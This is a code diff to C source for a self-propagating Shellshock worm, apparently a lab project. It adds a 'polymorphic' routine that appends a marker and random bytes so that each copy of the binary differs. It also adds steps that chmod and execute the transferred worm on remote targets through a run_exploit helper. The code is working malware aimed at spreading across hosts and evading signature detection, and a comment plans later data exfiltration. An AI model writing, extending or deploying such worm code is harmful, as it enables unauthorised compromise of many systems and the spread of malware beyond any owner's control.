@@ -1,8 +1,10 @@
+#define _XOPEN_SOURCE 500
 #include <stdio.h>
 #include <stdlib.h>
 #include <string.h>
 #include <unistd.h>
 #include <sys/socket.h>
+#include <sys/time.h>
 #include <netinet/in.h>
 #include <arpa/inet.h>
 #include <netdb.h>
@@ -66,6 +68,83 @@ char* base64_encode(const unsigned char* data, size_t input_length, size_t* outp
     
     encoded_data[*output_length] = '\0';
     return encoded_data;
+}
+
+/**
+ * Helper for memmem if not available or strictly standard C
+ */
+void *find_mem(const void *haystack, size_t haystacklen, const void *needle, size_t needlelen) {
+    if (needlelen > haystacklen) return NULL;
+    if (needlelen == 0) return (void *)haystack;
+    
+    const char *h = haystack;
+    for (size_t i = 0; i <= haystacklen - needlelen; i++) {
+        if (memcmp(h + i, needle, needlelen) == 0) {
+            return (void *)(h + i);
+        }
+    }
+    return NULL;
+}
+
+/**
+ * Polymorphic engine - adds random bytes to worm binary
+ * Returns dynamically allocated modified content (caller must free)
+ */
+unsigned char* polimorfism(unsigned char* file_content, size_t total_read, size_t* new_len) {
+    // Magic marker to identify end of original binary
+    const char *marker = "DEADBEEF_WORM_END";
+    size_t marker_len = strlen(marker);
+
+    // Find marker - we need the LAST occurrence because the string literal
+    // itself exists in the binary's data section.
+    
+    unsigned char *found = NULL;
+    unsigned char *current = file_content;
+    unsigned char *next_found = NULL;
+    
+    // Find the last occurrence of the marker
+    while ((next_found = find_mem(current, total_read - (current - file_content), marker, marker_len))) {
+        found = next_found;
+        current = found + 1;
+    }
+
+    size_t original_len = total_read;
+    
+    if (found) {
+        size_t offset = found - file_content;
+        size_t remaining = total_read - offset;
+        
+        // Heuristic: If the marker is found very close to the end (e.g. within last 100 bytes),
+        // it's likely the appended one.
+        if (remaining < (marker_len + 100)) {
+            original_len = offset;
+        }
+    }
+
+    // Generate random bytes
+    int random_bytes_count = 10 + (rand() % 41); // 10 to 50 bytes
+    
+    // Calculate new size
+    *new_len = original_len + marker_len + random_bytes_count;
+    
+    // Allocate new buffer
+    unsigned char* new_content = malloc(*new_len);
+    if (!new_content) {
+        return NULL;
+    }
+    
+    // Copy original content
+    memcpy(new_content, file_content, original_len);
+    
+    // Append marker
+    memcpy(new_content + original_len, marker, marker_len);
+    
+    // Append random bytes
+    for (int i = 0; i < random_bytes_count; i++) {
+        new_content[original_len + marker_len + i] = rand() % 256;
+    }
+    
+    return new_content;
 }
 
 /**
@@ -274,15 +353,23 @@ int infect_target(const char* ip, const char* argv0) {
         return 0;
     }
     
-    // TODO: function polimorfism(): add random bytes to make the worm code change 
-    // without changing the functionality. And maybe can add more lab techniques 
-    // to make it more complex
-    // worm_content = polimorfism(worm_content) -> to be done
-    
-    // Base64 encode
-    size_t b64_len;
-    char* b64_content = base64_encode(worm_content, file_size, &b64_len);
+    // Apply polymorphic mutation to create unique variant
+    printf("[*] Applying polymorphic mutation...\n");
+    size_t mutated_size;
+    unsigned char* mutated_content = polimorfism(worm_content, file_size, &mutated_size);
     free(worm_content);
+    
+    if (!mutated_content) {
+        printf("[-] Error applying polymorphic mutation\n");
+        return 0;
+    }
+    
+    printf("[*] Polymorphic mutation applied: %zu -> %zu bytes\n", file_size, mutated_size);
+    
+    // Base64 encode the mutated content
+    size_t b64_len;
+    char* b64_content = base64_encode(mutated_content, mutated_size, &b64_len);
+    free(mutated_content);
     
     if (!b64_content) {
         printf("[-] Error encoding binary\n");
@@ -355,6 +442,12 @@ int infect_target(const char* ip, const char* argv0) {
         "/usr/bin/base64 -d %s > %s", REMOTE_B64_PATH, REMOTE_WORM_PATH);
     run_exploit(ip, decode_cmd);
     
+    // 5.5. Make executable
+    printf("[*] Setting executable permissions...\n");
+    char chmod_cmd[512];
+    snprintf(chmod_cmd, sizeof(chmod_cmd), "/bin/chmod +x %s", REMOTE_WORM_PATH);
+    run_exploit(ip, chmod_cmd);
+    
     // 6. Execute
     printf("[+] Executing worm on %s...\n", ip);
     // We run it in background using nohup
@@ -377,9 +470,20 @@ int infect_target(const char* ip, const char* argv0) {
 
 // TODO: function data_exfiltration(): or the attack we want to finally do
 
+
+
+
+
+
+
+
+
 int main(int argc, char* argv[]) {
     (void)argc;  // Suppress unused parameter warning
     printf("=== C Shellshock Worm ===\n");
+    
+    // Initialize random seed for polymorphic engine
+    srand(time(NULL));
     
     // Delay to allow system to settle if just started
     sleep(2);
